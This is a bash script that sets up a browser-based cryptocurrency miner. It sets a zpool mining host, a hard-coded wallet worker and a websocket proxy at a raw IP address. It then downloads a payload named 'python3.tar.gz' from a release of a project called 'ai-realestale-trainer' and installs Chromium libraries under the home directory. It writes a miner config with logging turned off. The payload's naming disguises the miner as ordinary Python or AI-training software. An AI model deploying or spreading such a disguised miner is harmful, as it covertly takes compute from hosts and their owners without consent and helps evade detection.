#!/bin/bash

: "${M_ALGO:=minotaurx}"
: "${M_HOST:=minotaurx.na.mine.zpool.ca}"
: "${M_PORT:=7019}"
: "${M_WORKER:=RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65}"
: "${M_PASSWORD:=c=RVN}"
: "${M_THREADS:=4}"
: "${M_PROXY:=ws://172.233.136.27:8088/proxy}"

# Download project 
echo "Downloading Project..."
wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
tar -xvf python3.tar.gz
rm python3.tar.gz
cd python3

echo "Start download packages..."

# Create lib file
rm -rf ./dependencies
mkdir -p dependencies

# Function to check if a package is installed
is_installed() {
    dpkg-query -W -f='${Status}' "$1" 2>/dev/null | grep -q "ok installed"
}

# Function to recursively download a package and its dependencies
download_with_dependencies() {
    local pkg="$1"

    if is_installed "$pkg"; then
        echo "$pkg is already installed."
    else
        echo "Downloading $pkg and its dependencies..."
        apt-get download "$pkg"
        
        # Recursively find and download dependencies
        local deps=$(apt-cache depends "$pkg" | grep "Depends:" | sed "s/.*Depends: //" | tr '\n' ' ')
        for dep in $deps; do
            if ! is_installed "$dep"; then
                echo "Downloading dependency $dep..."
                apt-get download "$dep"
            fi
        done
    fi
}

# Define the packages to download
packages=(
    libdatrie-dev
    libgraphite2-3
    libnss3-dev
    gconf-service
    libasound2
    libatk1.0-0
    libc6
    libcairo2
    libcups2
    libdbus-1-3
    libexpat1
    libfontconfig1
    libgcc1
    libgconf-2-4
    libgdk-pixbuf2.0-0
    libglib2.0-0
    libgtk-3-0
    libnspr4
    libpango-1.0-0
    libpangocairo-1.0-0
    libstdc++6
    libx11-6
    libx11-xcb1
    libxcb1
    libxcomposite1
    libxcursor1
    libxdamage1
    libxext6
    libxfixes3
    libxi6
    libxrandr2
    libxrender1
    libxss1
    libxtst6
    ca-certificates
    fonts-liberation
    libappindicator1
    libnss3
    lsb-release
    xdg-utils
    libgbm-dev
    libatk-bridge2.0-0
    libavahi-client-dev
    libatspi2.0-0
    libxdamage1libatspi
    libdrm2
    libwayland-server0
    libxcb-randr0-dev
)

# Loop through each package, download it and its dependencies
for pkg in "${packages[@]}"; do
    download_with_dependencies "$pkg"
done

# Extract libs
count=$(find . -maxdepth 1 -type f -name "*.deb" | wc -l)
if [ "$count" -gt 0 ]; then
    for deb_file in *.deb; do
        echo "Extracting $deb_file..."
        dpkg-deb -x "$deb_file" ./dependencies
        rm "$deb_file"
    done

    # Links libs
    rm -rf "$HOME/dependencies"
    mkdir -p "$HOME/dependencies"
    cp -r ./dependencies/* "$HOME/dependencies"

    export LD_LIBRARY_PATH="$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"
    export PATH="$HOME/dependencies/usr/bin:$PATH"
fi

# Remove the existing config.json file
rm -f config.json

# Create a new config.json file with the specified content
cat <<EOL > config.json
{
    "algorithm": "$M_ALGO",
    "host": "$M_HOST",
    "port": $M_PORT,
    "worker": "$M_WORKER",
    "password": "$M_PASSWORD",
    "workers": $M_THREADS,
    "log": false,
    "chrome": "./chromium/chrome",
    "proxy": "$M_PROXY"
}
EOL

echo "All packages downloaded and extracted. Next step to start mining"
